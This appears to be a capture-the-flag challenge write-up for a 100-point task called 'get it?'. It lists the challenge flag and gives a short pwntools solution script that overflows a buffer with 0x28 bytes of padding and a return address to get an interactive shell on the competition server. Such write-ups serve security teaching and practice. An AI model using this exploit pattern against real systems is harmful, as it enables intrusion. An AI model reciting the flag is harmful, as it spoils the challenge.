# get it?

## Description

- Do you get it?

## Points

- 100

## Flag
- flag{y0u_deF_get_itls}

## Setup

- Make sure that competitors can connect to the challenge


## Solution

- super simple buffer overflow

```python
#!/usr/bin/env python
from pwn import *
#p = process("./get_it")
#p = remote("localhost", 1437)

p = remote("pwn.chal.csaw.io", 9001)
p.recvuntil("??")
p.sendline("A" * 0x28 + p64(0x4005b6))

p.interactive()
```